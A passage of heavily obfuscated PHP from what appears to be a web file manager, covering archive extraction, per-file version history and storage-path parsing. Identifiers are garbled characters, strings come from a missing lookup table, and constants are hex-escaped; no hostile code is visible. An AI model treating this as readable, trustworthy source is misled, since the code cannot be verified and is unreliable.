$˛óﬁ±ªÊ[$Ïù“Ü˛°[1286]]; mk_dir($≤Ê◊”Íº); file_put_contents(TEMP_FILES . $Ïù“Ü˛°[1262], $Ïù“Ü˛°[12]); if (IO::exist($ÅÍÁêÌ)) { return array($Ïù“Ü˛°[230] => $ÅÍÁêÌ, $Ïù“Ü˛°[1270] => $›˚Í˜Œ¥, $Ïù“Ü˛°[1272] => $≤Ê◊”Íº); } $—…ÙÊ∆Á = self::localFilePath($Æá§»ıî); if (!$—…ÙÊ∆Á) { $—…ÙÊ∆Á = $≤Ê◊”Íº . $Ïù“Ü˛°[1291]; if (!IO::exist($—…ÙÊ∆Á)) { self::copy($Æá§»ıî, $≤Ê◊”Íº, !1, get_path_this($—…ÙÊ∆Á)); } } if (!$—…ÙÊ∆Á || !IO::exist($—…ÙÊ∆Á)) { return !1; } if ($˛óﬁ±ªÊ[$Ïù“Ü˛°[1271]] == -1) { return array($Ïù“Ü˛°[230] => $—…ÙÊ∆Á, $Ïù“Ü˛°[1270] => $›˚Í˜Œ¥, $Ïù“Ü˛°[1272] => $≤Ê◊”Íº); } $Ê„∆¯Øº = $—…ÙÊ∆Á; foreach ($›˚Í˜Œ¥ as $ÉÕ∆≥é => $¿ﬁÁÓ¶˙) { if (!$¿ﬁÁÓ¶˙ || $¿ﬁÁÓ¶˙[$Ïù“Ü˛°[1271]] == $Ïù“Ü˛°[1269]) { break; } if (substr($¿ﬁÁÓ¶˙[$Ïù“Ü˛°[32]], -1, 1) == $Ïù“Ü˛°[8]) { break; } $ô®ΩåÇ‚ = in_array(get_path_ext($¿ﬁÁÓ¶˙[$Ïù“Ü˛°[1286]]), array($Ïù“Ü˛°[398], $Ïù“Ü˛°[1276], $Ïù“Ü˛°[1277], $Ïù“Ü˛°[1278], $Ïù“Ü˛°[1279], $Ïù“Ü˛°[1280])); $´‚“«ºı = $ÉÕ∆≥é == count($›˚Í˜Œ¥) - 1 && $ô®ΩåÇ‚; $•Ê∂§è… = $≤Ê◊”Íº . $¿ﬁÁÓ¶˙[$Ïù“Ü˛°[1286]]; $ä∆êûŒï = $≤Ê◊”Íº . get_path_this($¿ﬁÁÓ¶˙[$Ïù“Ü˛°[32]]); if (IO::exist($•Ê∂§è…)) { $Ê„∆¯Øº = $•Ê∂§è…; continue; } $Ùﬂ˛î¨ñ = $ÉÕ∆≥é == 0 ? get_path_ext($áîÈÉ∂≠) : get_path_ext($Ê„∆¯Øº); $›ìˆËåû = KodArchive::extract(self::iconvSystem($Ê„∆¯Øº), $≤Ê◊”Íº, $¿ﬁÁÓ¶˙[$Ïù“Ü˛°[1271]], $ÀÆÔ˚®ë, $Ùﬂ˛î¨ñ); self::unzipErrorCheck($›ìˆËåû, array($Ïù“Ü˛°[1292], $Æá§»ıî, $›˚Í˜Œ¥, $¿ﬁÁÓ¶˙, $•Ê∂§è…)); if (IO::exist($ä∆êûŒï)) { IO::rename($ä∆êûŒï, get_path_this($•Ê∂§è…)); } $Ê„∆¯Øº = $•Ê∂§è…; } $ÅÍÁêÌ = $Ê„∆¯Øº; return array($Ïù“Ü˛°[230] => $Ê„∆¯Øº, $Ïù“Ü˛°[1270] => $›˚Í˜Œ¥, $Ïù“Ü˛°[1272] => $≤Ê◊”Íº); } private static function unzipErrorCheck($˛…ÄºΩÚ, $∑◊“Á√‰ = false) { $ºûÔ◊¯‘ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($˛…ÄºΩÚ[$ºûÔ◊¯‘[1293]]) { return !0; } write_log(array($ºûÔ◊¯‘[1294], $˛…ÄºΩÚ, $∑◊“Á√‰), $ºûÔ◊¯‘[1295]); show_json($ºûÔ◊¯‘[1296] . json_encode($˛…ÄºΩÚ[$ºûÔ◊¯‘[1283]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ø•ÚøûÛ =& $_SERVER[ß⁄ˆÇ†Œ]; $ﬂõ√∏‘õ = $GLOBALS[$ø•ÚøûÛ[6]][$ø•ÚøûÛ[92]]; if ($ﬂõ√∏‘õ[$ø•ÚøûÛ[1297]] != 1) { return; } if ($ﬂõ√∏‘õ[$ø•ÚøûÛ[1298]] <= 0) { return; } if (isset($_REQUEST[$ø•ÚøûÛ[1299]]) && $_REQUEST[$ø•ÚøûÛ[1299]] == $ø•ÚøûÛ[91]) { return; } Hook::bind($ø•ÚøûÛ[1300], $ø•ÚøûÛ[1301]); Hook::bind($ø•ÚøûÛ[1302], $ø•ÚøûÛ[1303]); Hook::bind($ø•ÚøûÛ[1304], $ø•ÚøûÛ[1305]); Hook::bind($ø•ÚøûÛ[1306], $ø•ÚøûÛ[1307]); Hook::bind($ø•ÚøûÛ[1308], $ø•ÚøûÛ[1309]); Hook::bind($ø•ÚøûÛ[1310], $ø•ÚøûÛ[1311]); } public static function eventBeforeUpload($ﬁàãÈÑº) { if ($ﬁàãÈÑº[3] && $ﬁàãÈÑº[3] != REPEAT_REPLACE) { return; } $◊ﬂûËÂÁ = self::parsePath($ﬁàãÈÑº[0]); if (!$◊ﬂûËÂÁ) { return; } self::add($◊ﬂûËÂÁ); } public static function eventBeforeEdit($Ìö∆√±•) { $ÍÅ¯÷¸– = self::parsePath($Ìö∆√±•[0]); if (!$ÍÅ¯÷¸–) { return; } self::add($ÍÅ¯÷¸–); } public static function eventBeforeCopyFile($›á¬Ô¯¯, $´¶ÈÀâó, $õâúÒ√¬, $∏ò¬´∏ˆ, $¶ß¿›ê˜, $ñúÈ÷Ÿâ) { $¿º©⁄É¬ =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($õâúÒ√¬->_data[$¿º©⁄É¬[1232]]) && $õâúÒ√¬->_data[$¿º©⁄É¬[1232]]) { return; } $Æü˙—Ü™ = $õâúÒ√¬->getPathOuter($∏ò¬´∏ˆ); $Ì≥◊µ–Ç = self::parsePath($Æü˙—Ü™); if (!$Ì≥◊µ–Ç) { return; } self::add($Ì≥◊µ–Ç); } public static function eventBeforeRename($∏©Öó∫Î) { $Ïˆõ§§ó =& $_SERVER[ß⁄ˆÇ†Œ]; $º–ùπ‡ﬁ = self::parsePath($∏©Öó∫Î[0]); if (!$º–ùπ‡ﬁ) { return; } $‡›≤˘ Ä = self::checkInHistory($º–ùπ‡ﬁ); if (!$‡›≤˘ Ä) { return; } if ($‡›≤˘ Ä[$Ïˆõ§§ó[33]] == $Ïˆõ§§ó[230]) { $»¯¯ßÍ™ = self::listData($º–ùπ‡ﬁ); if ($»¯¯ßÍ™ && $»¯¯ßÍ™[$Ïˆõ§§ó[454]]) { self::moveHistory($º–ùπ‡ﬁ, $∏©Öó∫Î[1]); } } else { IO::rename($‡›≤˘ Ä[$Ïˆõ§§ó[87]], $∏©Öó∫Î[1]); } } public static function eventBeforeMove($√Ã≈˜…‰) { $ÿ°Ò˜˙ü =& $_SERVER[ß⁄ˆÇ†Œ]; $¬‰Ô¯É¿ = self::parsePath($√Ã≈˜…‰[0]); if (!$¬‰Ô¯É¿) { return; } $Ω«µ‹®ﬁ = self::parsePath($√Ã≈˜…‰[1]); if (!$Ω«µ‹®ﬁ) { return; } $›°ÕÔ—∏ = $√Ã≈˜…‰[3]; $ó˜¬øî¸ = self::checkInHistory($¬‰Ô¯É¿); if (!$ó˜¬øî¸) { return; } $÷ÜÕ ˘“ = self::pathHistory($Ω«µ‹®ﬁ); if ($ó˜¬øî¸[$ÿ°Ò˜˙ü[33]] == $ÿ°Ò˜˙ü[230]) { $íÆ¡±⁄î = self::listData($¬‰Ô¯É¿); $°˙≥—•¥ = rtrim($Ω«µ‹®ﬁ, $ÿ°Ò˜˙ü[8]) . $ÿ°Ò˜˙ü[8] . ($›°ÕÔ—∏ ? $›°ÕÔ—∏ : get_path_this($¬‰Ô¯É¿)); $öøëŒ—Ñ = self::listData($°˙≥—•¥); if ($íÆ¡±⁄î && $íÆ¡±⁄î[$ÿ°Ò˜˙ü[454]] && $öøëŒ—Ñ && $öøëŒ—Ñ[$ÿ°Ò˜˙ü[454]]) { return self::clear($¬‰Ô¯É¿); } if ($íÆ¡±⁄î && $íÆ¡±⁄î[$ÿ°Ò˜˙ü[454]]) { self::moveHistory($¬‰Ô¯É¿, $›°ÕÔ—∏, $÷ÜÕ ˘“); } } else { IO::move($ó˜¬øî¸[$ÿ°Ò˜˙ü[87]], $÷ÜÕ ˘“, !1, $›°ÕÔ—∏); self::clearEmptyFolder(IO::pathFather($ó˜¬øî¸[$ÿ°Ò˜˙ü[87]])); } } public static function eventAfterRemove($±ÓØ⁄òî, $Ù∆Ìè◊á) { $œÛéÔÜø =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Ù∆Ìè◊á) { return; } $¥ì≥Èßø = self::parsePath($±ÓØ⁄òî[0]); if (!$¥ì≥Èßø) { return; } $å®ì˙Íë = self::checkInHistory($¥ì≥Èßø); if (!$å®ì˙Íë) { return; } if ($å®ì˙Íë[$œÛéÔÜø[33]] == $œÛéÔÜø[230]) { $ìõ¯õÒ€ = self::listData($¥ì≥Èßø, !1); if ($ìõ¯õÒ€ && $ìõ¯õÒ€[$œÛéÔÜø[454]]) { self::clear($¥ì≥Èßø, !1); } } else { IO::remove($å®ì˙Íë[$œÛéÔÜø[87]]); self::clearEmptyFolder(IO::pathFather($å®ì˙Íë[$œÛéÔÜø[87]])); } } private static function checkInHistory($ÜƒËîÅπ) { $ª“π∫Áî = self::pathHistory($ÜƒËîÅπ); if (!IO::exist($ª“π∫Áî)) { $ª“π∫Áî .= $_SERVER[ß⁄ˆÇ†Œ][1312]; } return IO::exist($ª“π∫Áî) ? IO::info($ª“π∫Áî) : !1; } private static function parsePath($ïÄ®Ÿƒó) { $òòÇë∆€ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ïÄ®Ÿƒó) { return !1; } if (isset($GLOBALS[$òòÇë∆€[1313]]) && $GLOBALS[$òòÇë∆€[1313]]) { return; } $êﬁ¿è ¥ = KodIO::parse($ïÄ®Ÿƒó); $«†ƒ¶˜ˆ = $êﬁ¿è ¥[$òòÇë∆€[33]]; $•‘÷§Úƒ = !$«†ƒ¶˜ˆ || $«†ƒ¶˜ˆ == KodIO::KOD_IO || $«†ƒ¶˜ˆ == KodIO::KOD_SHARE_ITEM; if (!$•‘÷§Úƒ || !$êﬁ¿è ¥[$òòÇë∆€[1314]]) { return !1; } if (substr($ïÄ®Ÿƒó, 0, strlen(DATA_PATH . $òòÇë∆€[1315])) == DATA_PATH . $òòÇë∆€[1315]) { return !1; } if ($«†ƒ¶˜ˆ == KodIO::KOD_SHARE_ITEM) { $„‘◊é«ä = IO::init($ïÄ®Ÿƒó); if ($„‘◊é«ä->pathParse[$òòÇë∆€[1228]]) { return self::parsePath($„‘◊é«ä->pathParse[$òòÇë∆€[1228]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÑÀÙ∞Í¨ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $òòÇë∆€[1316]); foreach ($ÑÀÙ∞Í¨ as $ù“îÑÖç) { if (!$«†ƒ¶˜ˆ && substr($ïÄ®Ÿƒó, 0, strlen($ù“îÑÖç)) == $ù“îÑÖç) { return !1; } } self::log($GLOBALS[$òòÇë∆€[1223]] . $òòÇë∆€[1317] . $ïÄ®Ÿƒó); return $ïÄ®Ÿƒó; } private static function pathHistory($ …µ⁄ºî) { $ç°˜ÏË =& $_SERVER[ß⁄ˆÇ†Œ]; $˛∞Ì≥Âç = self::$_historyBase . ltrim(KodIO::clear($ …µ⁄ºî), $ç°˜ÏË[8]); $˛∞Ì≥Âç = str_replace(array($ç°˜ÏË[1318]), array($ç°˜ÏË[1319]), $˛∞Ì≥Âç); return $˛∞Ì≥Âç; } public static function log($˛ÒÄ§äÂ) { } public static function historyCount($èùÏÜè‰) { $ÚΩı˙˙€ =& $_SERVER[ß⁄ˆÇ†Œ]; $˚Á≠–≤Á = array(); $ı´∏ßŸ˚ = array(); foreach ($èùÏÜè‰ as $»ö§ù˙ö) { $”‹µ”ƒ‚ = get_path_father($»ö§ù˙ö); if (!$ı´∏ßŸ˚[$”‹µ”ƒ‚]) { $ı´∏ßŸ˚[$”‹µ”ƒ‚] = array(); } $ı´∏ßŸ˚[$”‹µ”ƒ‚][] = get_path_this($»ö§ù˙ö); } foreach ($ı´∏ßŸ˚ as $”‹µ”ƒ‚ => $πó‹±ÓÚ) { $ˆÂãˆ¿¿ = self::parsePath($”‹µ”ƒ‚); if (!$ˆÂãˆ¿¿) { continue; } foreach ($πó‹±ÓÚ as $™ƒŒ≠ªú) { $ÛèûÏ™û = self::listData(rtrim($ˆÂãˆ¿¿, $ÚΩı˙˙€[8]) . $ÚΩı˙˙€[8] . $™ƒŒ≠ªú, !1); if ($ÛèûÏ™û && $ÛèûÏ™û[$ÚΩı˙˙€[454]]) { $˚Á≠–≤Á[rtrim($”‹µ”ƒ‚, $ÚΩı˙˙€[8]) . $ÚΩı˙˙€[8] . $™ƒŒ≠ªú] = count($ÛèûÏ™û[$ÚΩı˙˙€[454]]); } } } return $˚Á≠–≤Á; } public static function add($ñõí˘Ô≈) { $Ê˙œ»ëñ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÜÓù√„¨ = self::listData($ñõí˘Ô≈); if (!$ÜÓù√„¨) { return; } $ì¥ÕÙ˙ﬂ = Model($Ê˙œ»ëñ[843])->get($Ê˙œ»ëñ[1320]); $æÑ≠Çﬁë = intval($GLOBALS[$Ê˙œ»ëñ[6]][$Ê˙œ»ëñ[92]][$Ê˙œ»ëñ[1298]]); $∂ÿ∞Æ£Ø = $ì¥ÕÙ˙ﬂ == $Ê˙œ»ëñ[1321] ? min(5, $æÑ≠Çﬁë) : $æÑ≠Çﬁë; if ($æÑ≠Çﬁë <= 0) { return; } $¥®ŒÂ€¢ = IO::info($ñõí˘Ô≈); $“µÍ÷œœ = $ÜÓù√„¨[$Ê˙œ»ëñ[454]]; if ($¥®ŒÂ€¢[$Ê˙œ»ëñ[79]] == 0) { return; } if ($¥®ŒÂ€¢[$Ê˙œ»ëñ[79]] >= 1024 * 1024 * 500) { return !1; } $ı¶ñˆ≠ê = IO::hashSimple($ñõí˘Ô≈); if ($“µÍ÷œœ && $“µÍ÷œœ[0][$Ê˙œ»ëñ[680]] == $ı¶ñˆ≠ê) { return !0; } if (array_key_exists($Ê˙œ»ëñ[233], $¥®ŒÂ€¢) && !$¥®ŒÂ€¢[$Ê˙œ»ëñ[233]]) { return !1; } $¡Á¥Ï≈• = short_id(time()); $ﬂÈ“¡‰¡ = array($Ê˙œ»ëñ[483] => $¡Á¥Ï≈•, $Ê˙œ»ëñ[680] => $ı¶ñˆ≠ê, $Ê˙œ»ëñ[32] => $¥®ŒÂ€¢[$Ê˙œ»ëñ[32]] . $Ê˙œ»ëñ[10] . date($Ê˙œ»ëñ[1322]) . rand_string(1), $Ê˙œ»ëñ[79] => $¥®ŒÂ€¢[$Ê˙œ»ëñ[79]], $Ê˙œ»ëñ[535] => USER_ID, $Ê˙œ»ëñ[231] => time(), $Ê˙œ»ëñ[1323] => $Ê˙œ»ëñ[12]); IO::mkdir($ÜÓù√„¨[$Ê˙œ»ëñ[1324]]); $‰‚ò∑Ò≠ = IO::copy($ñõí˘Ô≈, $ÜÓù√„¨[$Ê˙œ»ëñ[1324]], !1, $ﬂÈ“¡‰¡[$Ê˙œ»ëñ[32]]); if (!$‰‚ò∑Ò≠) { self::clearEmptyFolder($ÜÓù√„¨[$Ê˙œ»ëñ[1324]]); return !1; } array_unshift($“µÍ÷œœ, $ﬂÈ“¡‰¡); if (count($“µÍ÷œœ) > $∂ÿ∞Æ£Ø) { $Ä≤ÍˆË” = array_slice($“µÍ÷œœ, $∂ÿ∞Æ£Ø); foreach ($Ä≤ÍˆË” as $≠áæ÷≈˜) { IO::remove($ÜÓù√„¨[$Ê˙œ»ëñ[1324]] . $≠áæ÷≈˜[$Ê˙œ»ëñ[32]]); } $“µÍ÷œœ = array_slice($“µÍ÷œœ, 0, $∂ÿ∞Æ£Ø); } return self::saveData($ÜÓù√„¨[$Ê˙œ»ëñ[1325]], $“µÍ÷œœ); } public static function remove($”ñ√Îêù, $ÕÊÙ’üë) { $ì˜–ÒêÀ =& $_SERVER[ß⁄ˆÇ†Œ]; $“∑ÈøÙœ = self::listData($”ñ√Îêù); $ÄÍ•ù¨Õ = array(); if (!$“∑ÈøÙœ) { return !1; } foreach ($“∑ÈøÙœ[$ì˜–ÒêÀ[454]] as $îÌΩ¨Ûà) { if ($îÌΩ¨Ûà[$ì˜–ÒêÀ[483]] == $ÕÊÙ’üë) { IO::remove($“∑ÈøÙœ[$ì˜–ÒêÀ[1324]] . $îÌΩ¨Ûà[$ì˜–ÒêÀ[32]]); continue; } $ÄÍ•ù¨Õ[] = $îÌΩ¨Ûà; } return self::saveData($“∑ÈøÙœ[$ì˜–ÒêÀ[1325]], $ÄÍ•ù¨Õ); } public static function clear($ã∂Ú…á , $±‹≥ª¬  = true) { $»≈˙πÑ =& $_SERVER[ß⁄ˆÇ†Œ]; $∏Æ†€ • = self::listData($ã∂Ú…á , $±‹≥ª¬ ); if (!$∏Æ†€ •) { return !1; } foreach ($∏Æ†€ •[$»≈˙πÑ[454]] as $≥±’π•˛) { IO::remove($∏Æ†€ •[$»≈˙πÑ[1324]] . $≥±’π•˛[$»≈˙πÑ[32]]); } return self::saveData($∏Æ†€ •[$»≈˙πÑ[1325]], array()); } public static function moveHistory($∑èãÈ‰§, $˘∞¢˚¸Õ = '', $òåî’Ù÷ = '') { $◊Ùãªåè =& $_SERVER[ß⁄ˆÇ†Œ]; $Ùìµ„µπ = self::listData($∑èãÈ‰§, !1); if (!$Ùìµ„µπ || !$Ùìµ„µπ[$◊Ùãªåè[454]]) { return !1; } $¿∫™ŸÌò = $◊Ùãªåè[1312]; $˘∞¢˚¸Õ = $˘∞¢˚¸Õ ? $˘∞¢˚¸Õ : get_path_this($∑èãÈ‰§); $òåî’Ù÷ = $òåî’Ù÷ ? $òåî’Ù÷ : $Ùìµ„µπ[$◊Ùãªåè[1324]]; $™“õ§£· = substr(get_path_this($Ùìµ„µπ[$◊Ùãªåè[1325]]), 0, -strlen($¿∫™ŸÌò)); foreach ($Ùìµ„µπ[$◊Ùãªåè[454]] as $» çïŒ‡ => $àÛÄ´Ø) { $Ωœ…Ôüÿ = $˘∞¢˚¸Õ . substr($àÛÄ´Ø[$◊Ùãªåè[32]], strlen($™“õ§£·)); $áó˚‰Ù° = IO::move($Ùìµ„µπ[$◊Ùãªåè[1324]] . $àÛÄ´Ø[$◊Ùãªåè[32]], $òåî’Ù÷, !1, $Ωœ…Ôüÿ); if ($áó˚‰Ù°) { $Ùìµ„µπ[$◊Ùãªåè[454]][$» çïŒ‡][$◊Ùãªåè[32]] = $Ωœ…Ôüÿ; } } $Ùìµ„µπ[$◊Ùãªåè[1325]] = IO::move($Ùìµ„µπ[$◊Ùãªåè[1325]], $òåî’Ù÷, !1, $˘∞¢˚¸Õ . $¿∫™ŸÌò); self::saveData($Ùìµ„µπ[$◊Ùãªåè[1325]], $Ùìµ„µπ[$◊Ùãªåè[454]]); self::clearEmptyFolder($Ùìµ„µπ[$◊Ùãªåè[1324]]); } public static function rollback($¢Ñ±‚ƒ, $ï∫¸Œâ›) { $“¨€•≠ =& $_SERVER[ß⁄ˆÇ†Œ]; $È´Å¥ˆê = self::listData($¢Ñ±‚ƒ); if (!$È´Å¥ˆê) { return; } $Ï˝Îœ˛˙ = IO::info($¢Ñ±‚ƒ); foreach ($È´Å¥ˆê[$“¨€•≠[454]] as $Æ√’¢˜› => $ì’ıî· ) { if ($ì’ıî· [$“¨€•≠[483]] == $ï∫¸Œâ›) { self::add($¢Ñ±‚ƒ); $ÑÆ≥©⁄¶ = $È´Å¥ˆê[$“¨€•≠[1324]] . $ì’ıî· [$“¨€•≠[32]]; $≠àÔ”ŒΩ = IO::copy($ÑÆ≥©⁄¶, IO::pathFather($¢Ñ±‚ƒ), REPEAT_REPLACE, $Ï˝Îœ˛˙[$“¨€•≠[32]]); if ($≠àÔ”ŒΩ) { self::remove($¢Ñ±‚ƒ, $ï∫¸Œâ›); } return $≠àÔ”ŒΩ; } } return !1; } public static function setDetail($≤£¯¯æã, $∫ã•◊‹˘, $ıïÚ∞ä‡) { $¨ü◊öûœ =& $_SERVER[ß⁄ˆÇ†Œ]; $›Ïä∞¨â = self::listData($≤£¯¯æã); if (!$›Ïä∞¨â) { return; } foreach ($›Ïä∞¨â[$¨ü◊öûœ[454]] as $∫ê∞Ö‡ø => $µèìåà¥) { if ($µèìåà¥[$¨ü◊öûœ[483]] == $∫ã•◊‹˘) { $›Ïä∞¨â[$¨ü◊öûœ[454]][$∫ê∞Ö‡ø][$¨ü◊öûœ[1323]] = $ıïÚ∞ä‡; self::saveData($›Ïä∞¨â[$¨ü◊öûœ[1325]], $›Ïä∞¨â[$¨ü◊öûœ[454]]); return !0; } } return !1; } public static function fileInfo($øö√•Å’, $•è˛Íû™) { $ı±≤á·€ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ñÿ‹—éﬂ = self::listData($øö√•Å’); if (!$Ñÿ‹—éﬂ) { show_json(LNG($ı±≤á·€[108]), !1); } $Ä∞˘«≠ú = $ı±≤á·€[12]; foreach ($Ñÿ‹—éﬂ[$ı±≤á·€[454]] as $–„‰êéï => $àﬁõ„ô∞) { if ($àﬁõ„ô∞[$ı±≤á·€[483]] != $•è˛Íû™) { continue; } $Ä∞˘«≠ú = $Ñÿ‹—éﬂ[$ı±≤á·€[1324]] . $àﬁõ„ô∞[$ı±≤á·€[32]]; break; } if (!$Ä∞˘«≠ú) { show_json(LNG($ı±≤á·€[108]), !1); } return IO::info($Ä∞˘«≠ú); } public static function fileOut($¬ñŸØÒ“, $ßˆ¸Ÿ£â, $é§†Êù• = false) { $∆ø±õÃÕ =& $_SERVER[ß⁄ˆÇ†Œ]; $∂∫ïÆøÆ = self::fileInfo($¬ñŸØÒ“, $ßˆ¸Ÿ£â); $éÙ≠·Ôù =& $GLOBALS[$∆ø±õÃÕ[7]]; $é§†Êù• = isset($éÙ≠·Ôù[$∆ø±õÃÕ[1275]]) && $éÙ≠·Ôù[$∆ø±õÃÕ[1275]] == 1; if (isset($éÙ≠·Ôù[$∆ø±õÃÕ[33]]) && $éÙ≠·Ôù[$∆ø±õÃÕ[33]] == $∆ø±õÃÕ[1326]) { return IO::fileOutImage($∂∫ïÆøÆ[$∆ø±õÃÕ[87]], $éÙ≠·Ôù[$∆ø±õÃÕ[1327]]); } IO::fileOut($∂∫ïÆøÆ[$∆ø±õÃÕ[87]], $é§†Êù•, get_path_this($¬ñŸØÒ“)); } public static function listData($ÎÕŸ—Òº, $≤œª≤ñ¶ = true) { $‰·–≥—‘ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($≤œª≤ñ¶ && !IO::exist($ÎÕŸ—Òº)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÎÕŸ—Òº, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $˜úâÕˆ‚ = self::pathHistory($ÎÕŸ—Òº); $¬œã‡º◊ = array($‰·–≥—‘[1325] => $˜úâÕˆ‚ . $‰·–≥—‘[1312], $‰·–≥—‘[1324] => rtrim(get_path_father($˜úâÕˆ‚), $‰·–≥—‘[8]) . $‰·–≥—‘[8], $‰·–≥—‘[454] => array()); $®ç´™ÎÏ = IO::getContent($¬œã‡º◊[$‰·–≥—‘[1325]]); if ($®ç´™ÎÏ) { $ÍÜ¸ õö = json_decode($®ç´™ÎÏ, !0); if (is_array($ÍÜ¸ õö)) { $¬œã‡º◊[$‰·–≥—‘[454]] = $ÍÜ¸ õö; } } return $¬œã‡º◊; } private static function saveData($èåœÕﬂ¢, $ÕíÕ›•¿) { $‹∫Û≥Ü≤ =& $_SERVER[ß⁄ˆÇ†Œ]; self::log($‹∫Û≥Ü≤[1328] . $èåœÕﬂ¢ . $‹∫Û≥Ü≤[74] . count($ÕíÕ›•¿), $‹∫Û≥Ü≤[825]); if ($ÕíÕ›•¿) { return IO::setContent($èåœÕﬂ¢, json_encode($ÕíÕ›•¿)); } $œıÿÉïç = IO::pathFather($èåœÕﬂ¢); IO::remove($èåœÕﬂ¢); self::clearEmptyFolder($œıÿÉïç); return !0; } public static function clearEmptyFolder($ÿÿ¢¨¸˚) { $–øñﬁ… =& $_SERVER[ß⁄ˆÇ†Œ]; if (trim($ÿÿ¢¨¸˚, $–øñﬁ…[8]) == trim(self::$_historyBase, $–øñﬁ…[8])) { return; } $‰˘ÌŒ¸ = IO::pathFather($ÿÿ¢¨¸˚); $ï≠—„ÀÉ = IO::has($ÿÿ¢¨¸˚, !0); if ($ï≠—„ÀÉ[$–øñﬁ…[239]] > 0 || $ï≠—„ÀÉ[$–øñﬁ…[240]] > 0) { return; } IO::remove($ÿÿ¢¨¸˚); self::clearEmptyFolder($‰˘ÌŒ¸); } private static function getBasePath() { $íﬁÀ˚¯Ñ =& $_SERVER[ß⁄ˆÇ†Œ]; $‰ƒ÷œÚÃ = Model($íﬁÀ˚¯Ñ[1329])->get($íﬁÀ˚¯Ñ[1330]); if ($‰ƒ÷œÚÃ) { if (!IO::exist($‰ƒ÷œÚÃ)) { IO::mkdir($‰ƒ÷œÚÃ); } if (get_path_this($‰ƒ÷œÚÃ) == $íﬁÀ˚¯Ñ[1315]) { $∞“à ⁄è = $íﬁÀ˚¯Ñ[1331] . rand_string(8); @rename($‰ƒ÷œÚÃ, get_path_father($‰ƒ÷œÚÃ) . $íﬁÀ˚¯Ñ[8] . $∞“à ⁄è); $‰ƒ÷œÚÃ = DATA_PATH . $∞“à ⁄è . $íﬁÀ˚¯Ñ[8]; file_put_contents(DATA_PATH . $íﬁÀ˚¯Ñ[1262], $íﬁÀ˚¯Ñ[12]); Model($íﬁÀ˚¯Ñ[1329])->set($íﬁÀ˚¯Ñ[1330], $‰ƒ÷œÚÃ); } return $‰ƒ÷œÚÃ; } $‰ƒ÷œÚÃ = DATA_PATH . $íﬁÀ˚¯Ñ[1331] . rand_string(8) . $íﬁÀ˚¯Ñ[8]; $‰ƒ÷œÚÃ = IO::mkdir($‰ƒ÷œÚÃ); $‰ƒ÷œÚÃ = rtrim($‰ƒ÷œÚÃ, $íﬁÀ˚¯Ñ[8]) . $íﬁÀ˚¯Ñ[8]; file_put_contents($‰ƒ÷œÚÃ . $íﬁÀ˚¯Ñ[1262], $íﬁÀ˚¯Ñ[12]); file_put_contents(DATA_PATH . $íﬁÀ˚¯Ñ[1262], $íﬁÀ˚¯Ñ[12]); Model($íﬁÀ˚¯Ñ[1329])->set($íﬁÀ˚¯Ñ[1330], $‰ƒ÷œÚÃ); return $‰ƒ÷œÚÃ; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\122\x65\143\171\143\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\x46\151\154\145\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\162\x46\x69\154\145\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\122\x6f\157\164\x53\x65\154\146\x7d"; const KOD_USER_SHARE = "\173\x75\163\x65\x72\x53\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\162\x53\150\x61\x72\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\145\x54\157\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\x72\x65\x49\x74\145\155\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\x72\145\x49\x74\145\155\114\151\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\141\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\x62\154\157\143\153\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\156\x63\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\145\162\175"; public static function typeList() { $àØä¡Ìè =& $_SERVER[ß⁄ˆÇ†Œ]; return array($àØä¡Ìè[1332] => self::KOD_SOURCE, $àØä¡Ìè[1333] => self::KOD_USER_RECYCLE, $àØä¡Ìè[1334] => self::KOD_USER_FAV, $àØä¡Ìè[1335] => self::KOD_USER_FILE_TAG, $àØä¡Ìè[1336] => self::KOD_USER_FILE_TYPE, $àØä¡Ìè[1337] => self::KOD_GROUP_ROOT_SELF, $àØä¡Ìè[1338] => self::KOD_USER_SHARE, $àØä¡Ìè[1339] => self::KOD_USER_SHARE_LINK, $àØä¡Ìè[1340] => self::KOD_USER_SHARE_TO_ME, $àØä¡Ìè[1341] => self::KOD_SHARE_ITEM, $àØä¡Ìè[1342] => self::KOD_SHARE_LINK, $àØä¡Ìè[1343] => self::KOD_SEARCH, $àØä¡Ìè[1344] => self::KOD_BLOCK, $àØä¡Ìè[1345] => self::KOD_IO, $àØä¡Ìè[1346] => self::KOD_USER_RECENT, $àØä¡Ìè[1347] => self::KOD_USER_DRIVER); } public static function parse($˛âﬁ∞ûÎ) { $Å∏ÖÏÔì =& $_SERVER[ß⁄ˆÇ†Œ]; $˛âﬁ∞ûÎ = self::clear($˛âﬁ∞ûÎ); $»õµË®˙ = array_values(self::typeList()); preg_match($Å∏ÖÏÔì[1348], $˛âﬁ∞ûÎ, $∑–ÃÌÃ·); $éüïÓ€± = array($Å∏ÖÏÔì[504] => !1, $Å∏ÖÏÔì[1349] => !1, $Å∏ÖÏÔì[501] => 